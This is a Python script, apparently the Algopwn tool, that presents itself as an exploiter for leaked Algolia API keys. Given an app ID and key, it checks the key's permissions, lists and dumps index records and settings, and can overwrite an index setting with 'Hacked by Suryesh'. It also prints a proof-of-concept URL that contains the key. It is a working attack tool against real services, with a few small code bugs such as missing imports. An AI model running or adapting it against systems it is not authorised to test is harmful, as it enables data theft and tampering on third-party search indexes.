#!/usr/bin/env python3
import argparse
import json
import requests
import sys
from colorama import Fore, Style, init


SCRIPT_VERSION = "1.0.0"
REMOTE_SCRIPT_URL = "https://raw.githubusercontent.com/Suryesh/Algopwn/main/algopwn.py"


# Banner

def print_banner():
    banner = r"""
   _   _               ___                 
  /_\ | | __ _  ___   / _ \__      ___ __  
 //_\\| |/ _` |/ _ \ / /_)/\ \ /\ / / '_ \ 
/  _  \ | (_| | (_) / ___/  \ V  V /| | | |
\_/ \_/_|\__, |\___/\/       \_/\_/ |_| |_|
         |___/                             
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)
    print(Fore.GREEN + "      Algolia API Key Exploiter by Suryesh v: {}.format(SCRIPT_VERSION)\n" + Style.RESET_ALL)
    print(f"{Fore.MAGENTA}You can follow me on Twitter/X: {Fore.CYAN}https://x.com/Suryesh_92{Style.RESET_ALL}\n")
    print(f"{Fore.MAGENTA}Subscribe to my Youtube Channel: {Fore.CYAN}https://www.youtube.com/@HackWithSuryesh{Style.RESET_ALL}\n")

def help_menu():
    print_banner()
    help_text = f"""
{Fore.YELLOW}Usage:{Style.RESET_ALL}
1. Run the script directly:
   python3 algolia.py

2. You will be prompted to enter:
   - Algolia Application ID & Algolia API Key

3. The tool will:
   - Fetch key ACLs
   - Identify if the key has Sensitive or Informative permissions
   - If sensitive, ask whether to run exploitation
   - Exploitation updates highlightPreTag for safe exploitation and prints PoC verification URL
"""
    print(help_text)

init(autoreset=True)


def check_for_updates():
    try:
        response = requests.get(REMOTE_SCRIPT_URL)
        if response.status_code == 200:
            remote_version = re.search(r'SCRIPT_VERSION = "(\d+\.\d+\.\d+)"', response.text)
            if remote_version and remote_version.group(1) != SCRIPT_VERSION:
                print(colored(f"\nUpdate available: v{remote_version.group(1)}", 'green'))
                if input(colored("Update now? (y/n): ", 'yellow')).lower() == 'y':
                    with open(__file__, 'w') as f:
                        f.write(response.text)
                    print(colored("Update successful! Please restart.", 'green'))
                    sys.exit(0)
    except Exception:
        pass

# acl permission

SENSITIVE_ACLS = {
    "addObject", "deleteObject", "deleteIndex", "editSettings", "addUserKey", "deleteUserKey", "editSettings","seeUnretrievableAttributes","analytics","logs",
}
INFORMATIVE_ACLS = {"search", "listIndexes", "settings"}

# key info

def get_key_info(app_id, api_key):
    url = f"https://{app_id}.algolia.net/1/keys/{api_key}"
    headers = {"X-Algolia-Application-Id": app_id, "X-Algolia-API-Key": api_key}
    return requests.get(url, headers=headers).json()

def list_indexes(app_id, api_key):
    url = f"https://{app_id}-dsn.algolia.net/1/indexes/"
    headers = {"X-Algolia-Application-Id": app_id, "X-Algolia-API-Key": api_key}
    return requests.get(url, headers=headers).json()

def fetch_index_data(app_id, api_key, index_name):
    url = f"https://{app_id}-dsn.algolia.net/1/indexes/{index_name}"
    headers = {"X-Algolia-Application-Id": app_id, "X-Algolia-API-Key": api_key}
    return requests.get(url, headers=headers).json()

def fetch_index_settings(app_id, api_key, index_name):
    url = f"https://{app_id}-dsn.algolia.net/1/indexes/{index_name}/settings"
    headers = {"X-Algolia-Application-Id": app_id, "X-Algolia-API-Key": api_key}
    return requests.get(url, headers=headers).json()

# data update for safe poc

def update_index_settings(app_id, api_key, index_name):
    url = f"https://{app_id}-dsn.algolia.net/1/indexes/{index_name}/settings"
    headers = {
        "X-Algolia-Application-Id": app_id,
        "X-Algolia-API-Key": api_key,
        "Content-Type": "application/json",
    }
    payload = {"highlightPreTag": "Hacked by Suryesh"}
    return requests.put(url, headers=headers, json=payload).json()

# Exploit

def exploit_sensitive(app_id, api_key, found_sensitive):
    print(f"\n{Fore.RED}[+] Sensitive ACLs present: {list(found_sensitive)}{Style.RESET_ALL}")

    indexes = list_indexes(app_id, api_key)
    if "items" not in indexes:
        print(f"{Fore.YELLOW}[!] Could not list indexes or no indexes found.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}[+] Indexes available:{Style.RESET_ALL}")
    for i, idx in enumerate(indexes["items"]):
        print(f"{Fore.CYAN}{i+1}. {idx['name']}{Style.RESET_ALL}")

    choice = input(f"\n{Fore.YELLOW}Enter the index name to work with: {Style.RESET_ALL}").strip()
    if not choice:
        print(f"{Fore.RED}[!] No index name entered, stopping.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}[+] Fetching data from index: {choice}{Style.RESET_ALL}")
    data = fetch_index_data(app_id, api_key, choice)
    print(json.dumps(data, indent=2)[:800] + "...\n")  # truncate long output

    print(f"\n{Fore.GREEN}[+] Fetching settings for index: {choice}{Style.RESET_ALL}")
    settings = fetch_index_settings(app_id, api_key, choice)
    print(json.dumps(settings, indent=2))

    do_update = input(
        f"\n{Fore.YELLOW}Do you want to update this index's settings with payload (highlightPreTag=hacked)? (y/n): {Style.RESET_ALL}"
    ).strip().lower()
    if do_update == "y":
        result = update_index_settings(app_id, api_key, choice)
        print(f"\n{Fore.GREEN}[+] Update Response:{Style.RESET_ALL}")
        print(json.dumps(result, indent=2))

# POC URL

        poc_url = f"https://{app_id}-dsn.algolia.net/1/indexes/{choice}/settings?x-algolia-application-id={app_id}&x-algolia-api-key={api_key}"
        print(f"\n{Fore.MAGENTA}[+] PoC Verification URL:{Style.RESET_ALL}\n{Fore.CYAN}{poc_url}{Style.RESET_ALL}\n")

# Main function

def main():
    if "-h" in sys.argv or "--help" in sys.argv:
        help_menu()
        return
    print_banner()

    app_id = input(f"{Fore.YELLOW}Enter Algolia Application ID: {Style.RESET_ALL}").strip()
    api_key = input(f"{Fore.YELLOW}Enter Algolia API Key: {Style.RESET_ALL}").strip()

    key_info = get_key_info(app_id, api_key)
    acls = set(key_info.get("acl", []))
    found_sensitive = acls & SENSITIVE_ACLS
    found_informative = acls & INFORMATIVE_ACLS

    # Print clean JSON
    print(json.dumps({"info": key_info}, indent=2))

    if found_sensitive:
        print(
            f"\n{Fore.RED}This key has sensitive ACLs: {list(found_sensitive)}. You may be able to modify data.{Style.RESET_ALL}"
        )
        do_exploit = input(f"{Fore.YELLOW}Do you want to proceed with exploitation? (y/n): {Style.RESET_ALL}").strip().lower()
        if do_exploit == "y":
            exploit_sensitive(app_id, api_key, found_sensitive)
    else:
        print(
            f"\n{Fore.GREEN}This key only has {list(found_informative) or 'unknown'} permissions. So, it is Informative only.{Style.RESET_ALL}"
        )
if __name__ == "__main__":
    main()
    check_for_updates()
